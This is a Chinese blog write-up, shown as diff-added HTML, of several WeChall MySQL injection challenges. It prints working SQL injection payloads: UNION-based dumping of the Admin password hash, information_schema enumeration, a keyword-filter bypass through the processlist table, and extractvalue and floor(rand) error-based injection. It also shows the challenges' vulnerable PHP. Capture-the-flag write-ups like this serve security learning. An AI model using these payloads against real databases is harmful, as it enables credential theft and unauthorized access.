+<p style="max-width:100%;height:auto;">这次终于没有源代码可以看了，根据提示的Hint说是数据库的表名叫做"users"，这个提示非常重要啊，我们再试试输入框，发现似乎并没有过滤，直接单引号就可以插入我们自己的查询语句了，应该是目前来说的最简单的题目了。
+尝试了几次之后直接构造如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select password,1 from users where username="Admin"#
+PS：它会回显select的第一个字段，由此来爆密码
+</code></pre>
+<p style="max-width:100%;height:auto;">然后从回显里面看出密码的MD5值是215c61d0104f8925b5f7e4e87a7cbdfa，查了查竟然要我付费，作为屌丝我当然不答应啦，所以就这样吧</p>
+<h2 id="9tablenames">9.Table Names</h2>
+<p style="max-width:100%;height:auto;">先在username里直接试试最简单的</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; or 1=1#
+</code></pre>
+<p style="max-width:100%;height:auto;">发现有点作用，于是判断只是单纯的单引号。题目要求的我们把库名和表名爆出来，所以我们先开始尝试报错注入，</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select 1,2,3#
+</code></pre>
+<p style="max-width:100%;height:auto;">然后琢磨一下，直接开始爆库名和表名就可以了</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select 1,2,database()#
+</code></pre>
+<p style="max-width:100%;height:auto;">得到库名是<strong>gizmore_tableu61</strong>
+所以继续吧所有表名都爆出来呗</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select 1,2,group_concat(table_name) from information_schema.columns where table_schema="gizmore_tableu61"#
+</code></pre>
+<p style="max-width:100%;height:auto;">由此即得到正确的表名为<strong>usertableus4</strong>
+所以最后的答案就是<strong>gizmore<em>tableu61</em>usertableus4</strong></p>
+<h2 id="tablenamesii">Table Names II</h2>
+<p style="max-width:100%;height:auto;">看源码，重点就是下面的过滤：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if (preg_match(&amp;apos;/statistics|tables|columns|table_constraints|key_column_usage|partitions|schema_privileges|schemata|database|schema\(\)/i&amp;apos;, $username.$password))
+    {
+        echo GWF_HTML::error(GWF_PAGE_TITLE, $chall-&gt;lang(&amp;apos;on_match&amp;apos;));
+    }
+</code></pre>
+<p style="max-width:100%;height:auto;">然后简单测试了一下，
+如下的payload是可以执行的：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select 1,2,3#
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160316203809801" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后来构造一下语句把，观察下，发现很多我们暴库需要的关键字都被过滤了。但是关键的库<code style="max-width:100%;height:auto;">information_schema</code>是没有被过滤的，然后就想办法爆东西吧。
+这里我们有一个比较常用的语句：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">show processlist
+</code></pre>
+<p style="max-width:100%;height:auto;">通过这个最起码可以看到库名，而这个语句主要是<code style="max-width:100%;height:auto;">information_schema</code>库中的一个叫做<code style="max-width:100%;height:auto;">proccesslist</code>表的内容，那么我们也可以来尝试一下爆出它的内容即可，</p>
+<p style="max-width:100%;height:auto;">下图是本机实测的截图：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160316203822131" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">挨个儿爆内容，最后有效的payload如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select info,2,3 from information_schema.processlist#
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160316203837443" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">观察发现库名和表名都出来了，所以最后结果就是</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">nurfedtables37.userbobbytable7
+</code></pre>
+<h2 id="orderbyquery">Order By Query</h2>
+<p style="max-width:100%;height:auto;">这个观察源码发现注入点位于<code style="max-width:100%;height:auto;">order by</code>，那么就只有两种方法可行，一种是直接街上and构造双查询语句，第二种是在<code style="max-width:100%;height:auto;">DESC/ASC</code>后打上<code style="max-width:100%;height:auto;">,</code>号，然后再接上下一个<code style="max-width:100%;height:auto;">select</code>语句。
+但是这里我们看到源码中的关键句子如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">$query = "SELECT * FROM users ORDER BY $orderby $dir LIMIT 10";
+</code></pre>
+<p style="max-width:100%;height:auto;">而$dir就是<code style="max-width:100%;height:auto;">DESC/ASC</code>中的某一个，然后加上它会返回错误信息，所以就确定了就是报错注入了。这里报错注入有好几种方法，我用的是以下的语句：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?by=3 and extractvalue(1, (select password from users where username=CHAR(65, 100, 109, 105, 110)))#
+</code></pre>
+<p style="max-width:100%;height:auto;">上述句子中<code style="max-width:100%;height:auto;">CHAR(65, 100, 109, 105, 110)</code>就是<code style="max-width:100%;height:auto;">Admin</code>，因为要爆出<code style="max-width:100%;height:auto;">Admin</code>的密码，直接加上限定就好了。结果截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160316234227432" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这个MD5就是最后的答案：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">C3CBEB0C8ADC66F2922C65E7784BE14
+</code></pre>
+<p style="max-width:100%;height:auto;">这里最开始我遇到一个比较蠢的问题，最开始我的语句如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?by=3 and extractvalue(1, concat(0x5c,(select password from users where username=CHAR(65, 100, 109, 105, 110))))#
+</code></pre>
+<p style="max-width:100%;height:auto;">自作多情的多用的了一个concat来连接答案，结果报错出的MD5值如图：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160316234239565" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">即：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">\3C3CBEB0C8ADC66F2922C65E7784BE1
+</code></pre>
+<p style="max-width:100%;height:auto;">而我怎么提交都是错的，后来才发现这个MD5值只有31位，然后我就意识到还有一位没有显示出来，因为这里默认只显示32位，而我的多此一举导致最开始的<code style="max-width:100%;height:auto;">\</code>符号占用了一位，所以答案的最后一位就没出来，这种问题还是一定要少犯一点的好，免得白白耽搁时间。</p>
+<h2 id="12lightinthedarkness">12.Light in the Darkness</h2>
+<p style="max-width:100%;height:auto;">这里是一道报错注入。
+报错注入我个人常用的两种，<code style="max-width:100%;height:auto;">ExtractValue</code>和<code style="max-width:100%;height:auto;">floor</code>。
+不过这里我们看看它给的核心代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function blightVuln($password)
+{
+    # Do not mess with other sessions!
+    if ( (strpos($password, &amp;apos;/*&amp;apos;) !== false) || (stripos($password, &amp;apos;blight&amp;apos;) !== false) )
+    {
+        return false;
+    }
+
+    $db = blightDB();
+    $sessid = GWF_Session::getSessSID();
+    $query = "SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password=&amp;apos;$password&amp;apos;";
+    return $db-&gt;queryFirst($query) !== false;
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这里他把表名<code style="max-width:100%;height:auto;">blight</code>过滤了，也是比较蛋疼的，因为我们要通过<code style="max-width:100%;height:auto;">ExtractValue</code>爆出数据，那么我们就一定需要输入表名的，所以我们果断摒弃这个，选择通过&amp;apos;floor&amp;apos;来报错，原理这里我都不再赘述，不知道的可以私信我。因为主查询里面有了表名那么我们就在构造的时候就可以避开它，直接给上paylaod</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; or (select count(*) from (select 1 union select 2 union select 3)x group by concat((select password),floor(rand(0)*2)))#
+</code></pre>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./WeChall-mysql-WriteUp/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./WeChall-mysql-WriteUp/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./WeChall-mysql-WriteUp/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./WeChall-mysql-WriteUp/prism.js"></script>
+<script src="./WeChall-mysql-WriteUp/zooming.js"></script>
+<script src="./WeChall-mysql-WriteUp/Bendawang.js"></script>
+
+
